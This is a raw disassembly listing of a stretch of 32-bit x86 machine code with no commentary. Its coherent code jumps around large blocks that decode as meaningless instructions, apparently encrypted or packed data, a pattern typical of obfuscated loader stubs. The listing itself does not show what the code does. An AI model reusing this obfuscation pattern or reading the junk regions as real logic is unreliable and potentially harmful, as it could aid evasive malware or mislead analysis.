  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x1cb0d730],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x4020e4
  4020cf:	pop    edx
  4020d0:	ret    0xd68f
  4020d3:	and    bl,0xc7
  4020d6:	int3   
  4020d7:	cmp    al,0x35
  4020d9:	enter  0x79a4,0xcb
  4020dd:	mov    esi,0x1af4960
  4020e2:	lods   eax,DWORD PTR ds:[esi]
  4020e3:	jne    0x402147
  4020e5:	mov    cl,0xed
  4020e7:	cdq    
  4020e8:	jmp    0x5331:0x694ec043
  4020ef:	xor    al,0x53
  4020f1:	push   ebx
  4020f2:	and    BYTE PTR [edi],dl
  4020f4:	fcomp  DWORD PTR [ebx-0x2265c24e]
  4020fa:	jecxz  0x4020ce
  4020fc:	out    dx,al
  4020fd:	ins    DWORD PTR es:[edi],dx
  4020fe:	leave  
  4020ff:	mov    ecx,0x12ef411f
  402104:	(bad)  
  402106:	mov    BYTE PTR [ecx],dh
  402108:	pop    ds
  402109:	jb     0x402165
  40210b:	mul    DWORD PTR [ecx+0x5d800526]
  402111:	inc    ebx
  402112:	jl     0x4020a8
  402114:	dec    ebp
  402115:	idiv   DWORD PTR [ecx+0x7d]
  402118:	popf   
  402119:	mov    eax,ds:0x59aa63c0
  40211e:	push   0x3a
  402120:	fsubr  DWORD PTR [ebp-0x136189b7]
  402126:	lea    edi,[edx]
  402128:	aad    0xeb
  40212a:	rcl    BYTE PTR [bp+si+0x2362],0x80
  402130:	xchg   edi,esi
  402132:	dec    ecx
  402133:	in     al,0x39
  402135:	retf   
  402136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402137:	sub    eax,DWORD PTR ds:0xd0b6a646
  40213d:	cmp    esi,0xffffffa4
  402140:	rol    BYTE PTR [esp+edx*8-0x5ea334f0],1
  402147:	ins    DWORD PTR es:[edi],dx
  402148:	icebp  
  402149:	ror    DWORD PTR [esp+ebx*1],0x19
  40214d:	fld    TBYTE PTR [ebx]
  40214f:	ja     0x40213e
  402151:	inc    edx
  402152:	jne    0x402177
  402154:	adc    BYTE PTR [ebx],bh
  402156:	xchg   BYTE PTR [ecx-0x7f0f3afe],ah
  40215c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40215d:	adc    BYTE PTR [ebp-0x5724e732],cl
  402163:	mul    bh
  402165:	cdq    
  402166:	leave  
  402167:	sub    eax,esp
  402169:	xchg   ebp,eax
  40216a:	call   0x5146:0xc1f92f98
  402171:	dec    ebx
  402172:	jnp    0x4021a2
  402174:	push   0x15fb4e3f
  402179:	icebp  
  40217a:	rcl    eax,1
  40217c:	(bad)  
  40217d:	mov    dh,0x18
  40217f:	xchg   ebp,eax
  402180:	xchg   DWORD PTR [esi+0xd],edi
  402183:	push   edi
  402184:	add    DWORD PTR [ebx+0x684dfa51],esp
  40218a:	xchg   edi,eax
  40218b:	pop    eax
  40218c:	ror    BYTE PTR [esi+0x7e],0x31
  402190:	(bad)  
  402194:	aad    0x2f
  402196:	popa   
  402197:	push   ss
  402198:	cmp    edx,DWORD PTR [ecx]
  40219a:	daa    
  40219b:	iret   
  40219c:	sub    al,0xfe
  40219e:	mov    esi,0x152c9480
  4021a3:	shl    DWORD PTR [edi+0x3],0x5c
  4021a7:	mov    dh,0x87
  4021a9:	dec    esi
  4021aa:	jmp    0x402165
  4021ac:	lea    ebp,[edi+ecx*4]
  4021af:	pushw  0x40
  4021b2:	mov    bh,0x62
  4021b4:	adc    DWORD PTR [esi],eax
  4021b6:	gs call 0xf14bb1ce
  4021bc:	mov    ah,0x91
  4021be:	mov    cl,0x3b
  4021c0:	in     al,0x78
  4021c2:	aaa    
  4021c3:	fisttp DWORD PTR ds:0x5c79b4f7
  4021c9:	(bad)  
  4021ca:	leave  
  4021cb:	or     ch,BYTE PTR [ebp-0x1c7f9327]
  4021d1:	pop    edi
  4021d2:	adc    BYTE PTR [ecx-0x3a],0xd0
  4021d6:	xor    ch,al
  4021d8:	data16 addr16 lock jns 0x402173
  4021dd:	pop    esp
  4021de:	jno    0x402169
  4021e0:	sub    DWORD PTR [ecx-0x2251b473],0xa4168136
  4021ea:	xor    BYTE PTR ds:0x9ae22f54,ah
  4021f0:	(bad)  
  4021f1:	dec    eax
  4021f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021f3:	icebp  
  4021f4:	pop    ecx
  4021f5:	jg     0x402222
  4021f7:	es inc edi
  4021f9:	pop    edi
  4021fa:	pop    es
  4021fb:	jp     0x402208
  4021fd:	aas    
  4021fe:	dec    esp
  4021ff:	mov    ds:0x1ec59d1d,al
  402204:	dec    esp
  402205:	cld    
  402206:	mul    DWORD PTR [ebx+0x33fade48]
  40220c:	sub    ah,BYTE PTR [ebx]
  40220e:	data16 fdiv st,st(2)
  402211:	(bad)  
  402212:	adc    al,BYTE PTR [edx]
  402214:	cmp    eax,0x42e575b0
  402219:	cmp    al,0xe0
  40221b:	pop    ebp
  40221c:	div    esi
  40221e:	inc    ebp
  40221f:	xor    DWORD PTR [edi+0x5f],0xffffffa2
  402223:	push   ds
  402224:	xor    BYTE PTR [edx-0x63b85597],bl
  40222a:	xchg   ecx,eax
  40222b:	sub    BYTE PTR [edx+0x75b0d099],dl
  402231:	(bad)  
  402232:	pusha  
  402233:	sbb    DWORD PTR [ecx+ecx*8-0x264fa84c],edi
  40223a:	test   BYTE PTR [eax],cl
  40223c:	lahf   
  40223d:	dec    ebp
  40223e:	ins    BYTE PTR es:[edi],dx
  40223f:	mov    al,0xce
  402241:	repz leave 
  402243:	jmp    0x40229d
  402245:	cmp    BYTE PTR [edi],0x63
  402248:	pushf  
  402249:	fidiv  DWORD PTR [ebx+eiz*2-0x72acb2a3]
  402250:	mov    edi,ss
  402252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402253:	and    al,BYTE PTR [ebx+0x13c929ad]
  402259:	ror    DWORD PTR ds:0x5c67ddaa,1
  40225f:	jbe    0x402278
  402261:	adc    eax,DWORD PTR [ebx]
  402263:	pop    ds
  402264:	push   cs
  402265:	adc    DWORD PTR [edi+ebx*1+0x15],esp
  402269:	sub    dh,BYTE PTR [ebp+ebp*8-0x27d1406]
  402270:	enter  0x1084,0xf3
  402274:	and    esp,DWORD PTR [edx+0x7a2e99d4]
  40227a:	push   esp
  40227b:	pop    esp
  40227c:	inc    edi
  40227d:	fsub   st,st(7)
  40227f:	and    al,0xb2
  402281:	sbb    DWORD PTR [esi-0x2f4e75bc],0x2a0ae559
  40228b:	fld    TBYTE PTR [edx+0x6d]
  40228e:	push   ss
  40228f:	std    
  402290:	ret    0xe19d
  402293:	in     eax,dx
  402294:	mul    BYTE PTR [eax+0x683536c3]
  40229a:	lods   eax,DWORD PTR ds:[esi]
  40229b:	ret    
  40229c:	inc    eax
  40229d:	psubb  mm3,QWORD PTR [edx]
  4022a0:	fstp   TBYTE PTR [edi-0x18dfc11b]
  4022a6:	sbb    dh,dl
  4022a8:	je     0x40226d
  4022aa:	mov    WORD PTR [eax],?
  4022ac:	int3   
  4022ad:	out    0xdf,eax
  4022af:	lods   eax,DWORD PTR ds:[esi]
  4022b0:	inc    ecx
  4022b1:	(bad)
  4022b4:	outs   dx,BYTE PTR ds:[esi]
  4022b5:	xchg   esi,eax
  4022b6:	mov    ds:0x5ff03cb0,al
  4022bb:	jmp    0x4022af
  4022bd:	and    cl,0xf8
  4022c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022c1:	test   al,0x1c
  4022c3:	out    dx,al
  4022c4:	and    ch,BYTE PTR [eax]
  4022c6:	mov    dl,0x69
  4022c8:	add    ecx,DWORD PTR [eax]
  4022ca:	(bad)  
  4022cb:	or     al,dl
  4022cd:	mov    al,0xa8
  4022cf:	outs   dx,DWORD PTR ds:[esi]
  4022d0:	mov    BYTE PTR [edi+ebp*4],bh
  4022d3:	mov    ah,0x5c
  4022d5:	cs inc edx
  4022d7:	and    eax,0x1b54e0ea
  4022dc:	jp     0x40226a
  4022de:	repnz sbb al,0xa
  4022e1:	shl    BYTE PTR [ebx+0x5a],0xc2
  4022e5:	and    eax,0xd919706f
  4022ea:	fs test ebx,ecx
  4022ed:	(bad)  [edi]
  4022ef:	sbb    al,BYTE PTR [eax+0x39]
  4022f2:	sub    cl,BYTE PTR [edx+ebp*2]
  4022f5:	jne    0x402331
  4022f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022f8:	mov    esp,0x89540a08
  4022fd:	mov    bl,0x78
  4022ff:	ror    BYTE PTR [esi+0x11],cl
  402302:	rcl    BYTE PTR [edx],1
  402304:	sbb    BYTE PTR [edx],ch
  402306:	rcr    DWORD PTR [ebp-0x1c],0xb8
  40230a:	xor    BYTE PTR [ecx+0x2aa64bd2],bl
  402310:	adc    al,0x3d
  402312:	(bad)  [ecx]
  402314:	je     0x402376
  402316:	dec    esi
  402317:	push   edi
  402318:	dec    ebp
  402319:	retf   0x17
  40231c:	imul   eax,DWORD PTR [edx+0x79968fc2],0xfafb71c
  402326:	ss jge 0x40237d
  402329:	mov    ds:0x98b78ba8,al
  40232e:	in     al,dx
  40232f:	ds mov ebp,0x483209f4
  402335:	jo     0x402360
  402337:	jge    0x402398
  402339:	nop
  40233a:	mov    ah,0x50
  40233c:	rcl    BYTE PTR [edx+0x3dcdc6be],cl
  402342:	test   DWORD PTR [edi-0x19],edi
  402345:	xchg   ch,dh
  402347:	jp     0x4022f9
  402349:	sbb    al,BYTE PTR [ecx-0x67]
  40234c:	add    BYTE PTR [ebp+0x18],al
  40234f:	jns    0x40231f
  402351:	cmp    al,0xdf
  402353:	mov    bh,0xd3
  402355:	mov    ebx,0xa1304636
  40235a:	or     ebx,DWORD PTR [edx]
  40235c:	mov    esi,0x80dab24e
  402361:	daa    
  402362:	fs inc eax
  402364:	scas   al,BYTE PTR es:[edi]
  402365:	repnz outs dx,BYTE PTR ds:[esi]
  402367:	xchg   DWORD PTR [ebp-0x70fb789d],ecx
  40236d:	stc    
  40236e:	popf   
  40236f:	call   0x7ea030e8
  402374:	sbb    DWORD PTR [ebx],eax
  402376:	mov    esi,0xf0b2319e
  40237b:	aam    0x14
  40237d:	sub    BYTE PTR [edi],0xaa
  402380:	adc    ah,bh
  402382:	ins    BYTE PTR es:[edi],dx
  402383:	outs   dx,BYTE PTR ds:[esi]
  402384:	xchg   edx,eax
  402385:	and    dh,BYTE PTR [eax+edi*1-0x58dc4e1d]
  40238c:	xor    eax,0x47d54799
  402391:	bound  edx,QWORD PTR [esi+0x67440c3a]
  402397:	enter  0x63a1,0x3a
  40239b:	dec    eax
  40239c:	mov    ds:0x2512f6b3,al
  4023a1:	xor    al,0x3a
  4023a3:	inc    ecx
  4023a4:	cmp    eax,0xce7be8de
  4023a9:	aad    0xe7
  4023ab:	shr    ebx,cl
  4023ad:	dec    edi
  4023ae:	dec    edi
  4023af:	cmp    al,0xf6
  4023b1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023b3:	mov    bl,0x0
  4023b5:	and    cl,dh
  4023b7:	cmp    edx,ecx
  4023b9:	arpl   bp,dx
  4023bb:	jmp    0x2142:0x42073038
  4023c2:	mov    DWORD PTR [ebx],0x1941d8d5
  4023c8:	mov    ds:0xa03a40bd,al
  4023cd:	cmp    BYTE PTR [eax+ebp*1-0x20414a9],0x34
  4023d5:	rcl    BYTE PTR [ebx],1
  4023d7:	xchg   ebp,eax
  4023d8:	mov    cl,0x6c
  4023da:	nop
  4023db:	(bad)  
  4023dc:	loopne 0x402395
  4023de:	jle    0x4023f2
  4023e0:	ror    BYTE PTR [esi-0xe],cl
  4023e3:	gs adc edx,esp
  4023e6:	in     eax,0xc3
  4023e8:	add    eax,0x72967908
  4023ed:	int    0x9a
  4023ef:	shr    BYTE PTR [ebx],1
  4023f1:	fs test al,0x4c
  4023f4:	adc    dh,BYTE PTR [eax+0x4b]
  4023f7:	popf   
  4023f8:	mov    DWORD PTR [ebp-0x7b],edx
  4023fb:	pop    ebp
  4023fc:	dec    eax
  4023fd:	xlat   BYTE PTR ds:[ebx]
  4023fe:	inc    esi
  4023ff:	test   ebp,eax
  402401:	scas   eax,DWORD PTR es:[edi]
  402402:	outs   dx,BYTE PTR ds:[esi]
  402403:	sbb    BYTE PTR [esi],bh
  402405:	push   esp
  402407:	out    0x10,eax
  402409:	xor    BYTE PTR ds:0x497e226d,bh
  40240f:	jp     0x40246d
  402411:	jg     0x402425
  402413:	fimul  DWORD PTR [edi]
  402415:	repz rcr DWORD PTR [esi+0x40],1
  402419:	pop    ecx
  40241a:	leave  
  40241b:	mov    al,0xf0
  40241d:	or     ch,BYTE PTR [edi-0x4e088ba8]
  402423:	dec    edi
  402424:	dec    esi
  402425:	icebp  
  402426:	adc    BYTE PTR [ebx-0x44],ah
  402429:	and    eax,0xd5fb7ec
  40242e:	ds rcr bl,cl
  402431:	mov    dh,0x25
  402433:	mov    ds,WORD PTR [ebp-0x57]
  402436:	sbb    edx,0xffffffd1
  402439:	push   ss
  40243a:	jnp    0x4023ca
  40243c:	call   0xf676d59f
  402441:	dec    edx
  402442:	call   0xc666:0x4fcfdf3
  402449:	xor    al,0xff
  40244b:	shl    DWORD PTR [edx+0x33],cl
  40244e:	cdq    
  40244f:	sbb    DWORD PTR [ecx-0x6d19e703],ebx
  402455:	push   cs
  402456:	out    dx,eax
  402457:	push   esi
  402458:	push   0xb49cf60b
  40245d:	inc    ebx
  40245e:	stc    
  40245f:	ret    0xc7bf
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430546,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	jnp    0x402462
  4024b4:	nop
  4024b5:	fist   WORD PTR [edx+0xf]
  4024b8:	jle    0x402538
  4024ba:	xor    BYTE PTR [ecx+0x7e],0x7e
  4024be:	call   0xd4e0:0xb102a715
  4024c5:	scas   eax,DWORD PTR es:[edi]
  4024c6:	mov    esp,0x14b72fa6
  4024cb:	dec    ebx
  4024cc:	fs mov bl,0x56
  4024cf:	jmp    0x4b5cefec
  4024d4:	and    BYTE PTR [edi+eiz*8+0x51],0xd4
  4024d9:	repz push ss
  4024db:	jl     0x4024da
  4024dd:	mov    eax,ds:0x1a4d62dd
  4024e2:	popa   
  4024e3:	ficom  WORD PTR [eax+0x39]
  4024e6:	xchg   esp,eax
  4024e7:	hlt    
  4024e8:	jb     0x40255d
  4024ea:	daa    
  4024eb:	add    eax,0xee9a935c
  4024f0:	push   eax
  4024f1:	jne    0x402565
  4024f3:	(bad)  
  4024f4:	mov    eax,0x9b61a7fd
  4024f9:	mov    eax,ds:0xaf0eab4d
  4024fe:	jbe    0x402566
  402500:	xor    BYTE PTR [esi],ch
  402502:	or     al,0xca
  402504:	inc    ebp
  402505:	push   0xffffff9c
  402507:	ins    DWORD PTR es:[edi],dx
  402508:	sub    eax,0x60df5944
  40250d:	mov    ds:0x86f8ec1b,al
  402512:	pop    ebp
  402513:	popf   
  402514:	and    dh,BYTE PTR [ebx+eax*4+0xa]
  402518:	std    
  402519:	xchg   esi,eax
  40251a:	push   ebx
  40251b:	repnz sbb BYTE PTR ss:[ebx-0x53],al
  402520:	mov    ebx,0x411a14e9
  402525:	cld    
  402526:	jp     0x4024c9
  402528:	jmp    0x40252e
  40252a:	ss jae 0x4024d9
  40252d:	test   eax,0xc202615c
  402532:	int3   
  402533:	mov    eax,ds:0xbf6c25bb
  402538:	sbb    DWORD PTR [eax+0x57],edx
  40253b:	movnti DWORD PTR [ecx-0x61],edx
  40253f:	jne    0x402564
  402541:	and    DWORD PTR [eax-0x48],esi
  402544:	mov    eax,0xcd05ed41
  402549:	retf   
  40254a:	push   esi
  40254b:	add    al,0x2
  40254d:	retf   
  40254e:	cmp    dh,al
  402550:	jo     0x4025c8
  402552:	push   edi
  402553:	push   edi
  402554:	js     0x4025cf
  402556:	sub    eax,0xcfdcb155
  40255b:	cwde   
  40255c:	jo     0x40253e
  40255e:	loop   0x40257a
  402560:	pop    esp
  402561:	mov    ds:0x2c9bbdf5,al
  402566:	adc    dl,al
  402568:	mov    eax,0x5b1fee8d
  40256d:	jnp    0x40252d
  40256f:	push   0xfffffff9
  402571:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402573:	rcr    BYTE PTR [edi-0x4e],cl
  402576:	mov    ch,0xdd
  402578:	and    DWORD PTR [esi-0x56],edi
  40257b:	xor    cl,dh
  40257d:	mov    ebp,0x3946385
  402582:	loopne 0x4025bc
  402584:	js     0x40250e
  402586:	iret   
  402587:	xor    BYTE PTR [edi-0x341c7927],0x87
  40258e:	jne    0x402597
  402590:	jp     0x4025cd
  402592:	push   ebx
  402593:	sar    BYTE PTR [edi],0xf5
  402596:	mov    cl,0xb0
  402598:	les    eax,FWORD PTR [eax-0x23]
  40259b:	outs   dx,BYTE PTR ds:[esi]
  40259c:	dec    edx
  40259d:	dec    edi
  40259e:	sbb    eax,DWORD PTR [edx]
  4025a0:	xor    al,0x75
  4025a2:	jle    0x4025c7
  4025a4:	mov    ebp,ecx
  4025a6:	out    dx,al
  4025a7:	or     eax,0xc9c200bf
  4025ac:	jmp    0x9d4e:0x40614462
  4025b3:	add    DWORD PTR [ecx-0x61a59afc],edx
  4025b9:	sub    al,cl
  4025bb:	fs inc ebx
  4025bd:	test   DWORD PTR ds:0x510da15d,esp
  4025c3:	xchg   esp,eax
  4025c4:	jne    0x402563
  4025c6:	sti    
  4025c7:	pop    eax
  4025c8:	out    0x24,eax
  4025ca:	enter  0x45ed,0x5d
  4025ce:	adc    DWORD PTR [ebx],ebp
  4025d0:	shl    DWORD PTR [ebx-0x37],cl
  4025d3:	out    0xf8,al
  4025d5:	sub    cl,dh
  4025d7:	(bad)  
  4025d8:	daa    
  4025d9:	or     eax,0x14daef45
  4025de:	add    ebp,esi
  4025e0:	loop   0x402641
  4025e2:	add    ebp,DWORD PTR [edi+0xa]
  4025e5:	js     0x402651
  4025e7:	or     ebp,ebp
  4025e9:	pop    ds
  4025ea:	mov    esi,0x3104c260
  4025ef:	inc    ebp
  4025f0:	push   edi
  4025f1:	shl    DWORD PTR [ebp-0x7deffa8a],1
  4025f7:	arpl   WORD PTR [edx-0x49ea6413],dx
  4025fd:	retf   
  4025fe:	pusha  
  4025ff:	pcmpeqb mm2,QWORD PTR [eax+edi*2]
  402603:	shl    BYTE PTR [edx+0x5c],cl
  402606:	mov    ch,0x2c
  402608:	sub    bh,BYTE PTR [ebx+0x50eefecb]
  40260e:	pop    esi
  40260f:	bound  edx,QWORD PTR ds:0xcd1c0dc9
  402615:	xchg   edx,eax
  402616:	out    0x52,al
  402618:	shr    DWORD PTR [eax],cl
  40261a:	dec    edi
  40261b:	pop    ss
  40261c:	(bad)  
  40261e:	jmp    0x402693
  402620:	jmp    0x402650
  402622:	(bad)  
  402623:	int    0xe2
  402625:	aas    
  402626:	jb     0x4025f1
  402628:	out    0xf3,al
  40262a:	add    al,0xe9
  40262c:	cmc    
  40262d:	mov    dl,0xbe
  40262f:	(bad)  
  402630:	mov    eax,ds:0x4ad67f3b
  402635:	mov    dl,0xf8
  402637:	repz in al,0xb1
  40263a:	std    
  40263b:	pop    ds
  40263c:	and    eax,0x754ec194
  402641:	mov    DWORD PTR [ecx-0x7c],edx
  402644:	in     eax,dx
  402645:	mov    dl,0x59
  402647:	xchg   ebp,eax
  402648:	call   0x873d7b53
  40264d:	sub    ebx,eax
  40264f:	and    cl,dl
  402651:	hlt    
  402652:	push   ds
  402653:	adc    al,0xee
  402655:	push   0xf9c9e339
  40265a:	jmp    0x41b18db1
  40265f:	pop    eax
  402660:	inc    eax
  402661:	gs adc eax,0xc8ce421e
  402667:	add    dl,BYTE PTR [ebx+edx*8]
  40266a:	shr    DWORD PTR [edx],0x34
  40266d:	mov    al,ds:0x40e7d0e8
  402672:	mov    ds:0xcc28d6fa,eax
  402677:	(bad)  [edi-0x11]
  40267a:	mov    dh,BYTE PTR [eax+0x5d805eff]
  402680:	lahf   
  402681:	pop    eax
  402682:	inc    edi
  402683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402684:	mov    bh,0x6f
  402686:	push   esi
  402687:	add    DWORD PTR [ebx],edi
  402689:	jbe    0x4026bc
  40268b:	out    0x6a,eax
  40268d:	dec    eax
  40268e:	idiv   DWORD PTR [ecx+0x5dd26fa4]
  402694:	pusha  
  402695:	pusha  
  402696:	fnsave [ecx-0x25cec3d6]
  40269c:	xor    al,0x10
  40269e:	xchg   ebx,eax
  40269f:	push   ds
  4026a0:	adc    eax,0x718aab62
  4026a5:	jg     0x4026ac
  4026a7:	into   
  4026a8:	in     al,0x43
  4026aa:	jae    0x40267e
  4026ac:	popa   
  4026ad:	fnstcw WORD PTR [eax-0x2f]
  4026b0:	jae    0x402647
  4026b2:	push   DWORD PTR [ebx+ebx*4-0x76]
  4026b6:	and    al,0x9b
  4026b8:	clc    
  4026b9:	cmp    BYTE PTR [edx+0x73],al
  4026bc:	mov    esi,0x57a3244
  4026c1:	mov    al,0x6f
  4026c3:	mov    edi,0x51af49bf
  4026c8:	in     al,0x8c
  4026ca:	fcom   QWORD PTR [edi+0x70574960]
  4026d0:	and    esi,DWORD PTR [edx*2-0x58cdb768]
  4026d7:	js     0x402684
  4026d9:	dec    edx
  4026da:	sub    DWORD PTR [ebx+0x790370e6],0x3d555b04
  4026e4:	dec    edx
  4026e5:	lods   eax,DWORD PTR ds:[esi]
  4026e6:	mov    edi,0xe0cb6fc
  4026eb:	cld    
  4026ec:	push   0x86983777
  4026f1:	das    
  4026f2:	push   0xfd621e4b
  4026f7:	xor    BYTE PTR ds:0xd8b48f5e,0xe1
  4026fe:	ret    
  4026ff:	(bad)  
  402700:	in     eax,dx
  402701:	or     al,BYTE PTR [ecx]
  402703:	mov    edx,?
  402705:	add    esi,0x37
  402708:	sar    BYTE PTR [ebx+0x40],cl
  40270b:	scas   eax,DWORD PTR es:[edi]
  40270c:	imul   ebx,DWORD PTR [eax+0x66ceb606],0x1e
  402713:	and    ch,cl
  402715:	push   esp
  402716:	jge    0x40270b
  402718:	jle    0x402795
  40271a:	add    eax,0x863e8d64
  40271f:	xor    al,0x70
  402721:	pop    ebp
  402722:	in     eax,dx
  402723:	cwde   
  402724:	std    
  402725:	stos   BYTE PTR es:[edi],al
  402726:	in     al,0xb3
  402728:	lahf   
  402729:	ret    0xe649
  40272c:	ret    
  40272d:	cmp    al,0xde
  40272f:	sti    
  402730:	jp     0x4027a3
  402732:	dec    ebx
  402733:	pop    ebp
  402734:	fadd   st(4),st
  402736:	xor    cl,BYTE PTR [ecx]
  402738:	mov    ah,0xf1
  40273a:	jae    0x402730
  40273c:	scas   eax,DWORD PTR es:[edi]
  40273d:	int    0xd5
  40273f:	loop   0x40271f
  402741:	cld    
  402742:	in     al,dx
  402743:	loope  0x402759
  402745:	leave  
  402746:	outs   dx,DWORD PTR ss:[esi]
  402748:	daa    
  402749:	xchg   ebp,eax
  40274a:	jp     0x4026e9
  40274c:	jns    0x4026e2
  40274e:	dec    esi
  40274f:	adc    BYTE PTR [edi-0x129b4ff6],dh
  402755:	add    al,0xd8
  402757:	mov    cl,0x9b
  402759:	adc    DWORD PTR [eax+0x453dc467],ebx
  40275f:	pushf  
  402760:	add    esp,eax
  402762:	loopne 0x402780
  402764:	mov    WORD PTR [edi+0x76d805af],?
  40276a:	mov    ah,0x34
  40276c:	adc    eax,0x83e1701b
  402771:	icebp  
  402772:	mov    DWORD PTR [ecx],esp
  402774:	add    ebx,DWORD PTR [esi+edx*8+0x2]
  402778:	add    eax,0x5c4d04f1
  40277d:	pop    ss
  40277e:	or     bh,BYTE PTR [edx+0x286a7d53]
  402784:	(bad)  
  402785:	mov    ebp,DWORD PTR [edx+0x6aad8055]
  40278b:	in     al,dx
  40278c:	data16 aaa 
  40278e:	int3   
  40278f:	lods   eax,DWORD PTR ds:[esi]
  402790:	mov    ebp,0x8fde3da6
  402795:	ds sub eax,0x6f9cdb92
  40279b:	int    0xc8
  40279d:	add    BYTE PTR [ecx-0x11],0x31
  4027a1:	sub    eax,0x40716d39
  4027a6:	push   ds
  4027a7:	xor    BYTE PTR [eax],ch
  4027a9:	jo     0x4027f3
  4027ab:	jmp    0x4027bf
  4027ad:	fmul   st,st(6)
  4027af:	out    0x6d,eax
  4027b1:	jno    0x402783
  4027b3:	repz xchg ebp,eax
  4027b5:	and    al,cl
  4027b7:	fiadd  WORD PTR [edi+eax*1-0x481758b8]
  4027be:	pop    esi
  4027bf:	sbb    BYTE PTR [ebp-0x6a519ae],ch
  4027c5:	inc    ebx
  4027c6:	inc    eax
  4027c7:	jle    0x402837
  4027c9:	shl    BYTE PTR [ecx],1
  4027cb:	scas   eax,DWORD PTR es:[edi]
  4027cc:	mov    dh,0xa
  4027ce:	mov    ebx,0xe689ee7
  4027d3:	push   ebx
  4027d4:	sub    DWORD PTR [edx-0x2d],esi
  4027d7:	ins    BYTE PTR es:[edi],dx
  4027d8:	leave  
  4027d9:	jno    0x4027df
  4027db:	ins    BYTE PTR es:[edi],dx
  4027dc:	mul    dl
  4027de:	xor    esi,DWORD PTR [edx]
  4027e0:	out    dx,eax
  4027e1:	dec    esp
  4027e2:	out    dx,al
  4027e3:	push   cs
  4027e4:	sub    BYTE PTR [edx+0x6bccd9c6],bl
  4027ea:	dec    esp
  4027eb:	loop   0x402831
  4027ed:	xchg   esp,eax
  4027ee:	xchg   ecx,eax
  4027ef:	in     eax,dx
  4027f0:	push   edx
  4027f1:	mov    esi,edx
  4027f3:	pop    edi
  4027f4:	mov    ebx,DWORD PTR [edx+0x3df8e640]
  4027fa:	je     0x4027dc
  4027fc:	jg     0x402832
  4027fe:	jns    0x4027d2
  402800:	outs   dx,DWORD PTR ds:[esi]
  402801:	iret   
  402802:	loop   0x40279e
  402804:	pop    es
  402805:	or     eax,0x69c7e459
  40280a:	jge    0x40287b
  40280c:	nop
  40280d:	int3   
  40280e:	ss jmp 0x80cd09fe
  402814:	popa   
  402815:	mov    BYTE PTR [esi-0x5a],dl
  402818:	xchg   ebx,eax
  402819:	push   cs
  40281a:	mov    bl,0xf0
  40281c:	dec    edi
  40281d:	in     eax,dx
  40281e:	in     al,0x3b
  402820:	ret    0x42b9
  402823:	test   BYTE PTR [eax-0x25],ah
  402826:	adc    BYTE PTR [ebx+0x79],cl
  402829:	cmp    eax,0x2a5eecaf
  40282e:	mov    ebx,0x44d4bb05
  402833:	pop    esi
  402834:	test   BYTE PTR [ecx+eax*4-0x6a],0xad
  402839:	mov    ebx,0x512b264a
  40283e:	jmp    0xd4ef157d
  402843:	inc    ebp
  402844:	pop    edx
  402845:	sub    al,0x1
  402847:	ret    
  402848:	and    al,0x1a
  40284a:	or     al,0x12
  40284c:	mov    cl,0x28
  40284e:	xchg   ebp,eax
  40284f:	stc    
  402850:	or     al,0x3c
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e75e,0x14
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
